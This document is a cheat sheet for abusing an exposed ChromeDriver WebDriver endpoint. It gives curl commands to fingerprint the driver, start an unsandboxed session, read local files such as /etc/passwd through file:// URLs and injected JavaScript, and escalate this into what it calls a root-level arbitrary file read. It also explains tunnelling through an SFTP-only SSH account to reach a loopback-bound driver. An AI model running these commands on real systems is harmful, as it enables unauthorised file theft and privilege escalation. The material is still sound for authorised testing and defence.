# W3C WebDriver API — ChromeDriver Endpoint Cheat Sheet

ChromeDriver speaks the W3C WebDriver protocol as HTTP+JSON on its root path.
Default port: **9515** (chromedriver), **4444** (Selenium Grid hub).

## Fingerprint
```bash
curl -s http://127.0.0.1:9515/status
# {"value":{"build":{"version":"110.0.5481.77 (…)"},"ready":true,…}}
curl -s http://127.0.0.1:9515/
# 404 unknown command with chromedriver stacktrace → still ChromeDriver
```

## Create a session
```bash
curl -X POST http://127.0.0.1:9515/session \
  -H "Content-Type: application/json" \
  --data '{"capabilities":{"alwaysMatch":{"goog:chromeOptions":{"args":["--no-sandbox","--headless"]}}}}'
```
- `args` are Chrome CLI flags. `--headless` + `--no-sandbox` are common when
  the box already runs headless/root.
- Response: `{"value":{...},"sessionId":"<HEX>"}`. Keep the session ID.

## Navigate to a URL / file
```bash
curl -X POST http://127.0.0.1:9515/session/<SID>/url \
  -H "Content-Type: application/json" \
  --data '{"url":"file:///etc/hostname"}'
```
- `file:///...` works if Chrome is not sandboxed (or --no-sandbox given) and
  the driver user can read the target. **When chromedriver runs as root, this
  is a root-level arbitrary file read.**

## Read current page source (the file content)
```bash
curl http://127.0.0.1:9515/session/<SID>/source
# Content is HTML: <pre>…file contents…</pre>
```
- For binary/unicode data, prefer the execute/sync fetch approach.

## Execute JavaScript (arbitrary code in the browser context)
```bash
curl -X POST http://127.0.0.1:9515/session/<SID>/execute/sync \
  -H "Content-Type: application/json" \
  --data '{"script":"return document.body.innerText","args":[]}'
# async pattern:
curl -X POST http://127.0.0.1:9515/session/<SID>/execute/async \
  -H "Content-Type: application/json" \
  --data '{"script":"return fetch(arguments[0]).then(r=>r.text())","args":["file:///etc/passwd"]}'
```

## Other useful endpoints
```bash
curl  http://127.0.0.1:9515/session/<SID>/url            # current URL
curl  http://127.0.0.1:9515/session/<SID>/title          # title
curl  http://127.0.0.1:9515/session/<SID>/timeouts       # get timeouts
curl -X DELETE http://127.0.0.1:9515/session/<SID>       # close session
```

## Reaching a loopback-bound driver
- If bound to 127.0.0.1 only, tunnel in:
  - SFTP-only account (ForceCommand internal-sftp) still forwards if
    `AllowTcpForwarding` is not set to `no` in sshd_config — paramiko
    `Transport.open_channel("direct-tcpip", ...)` works with password auth.
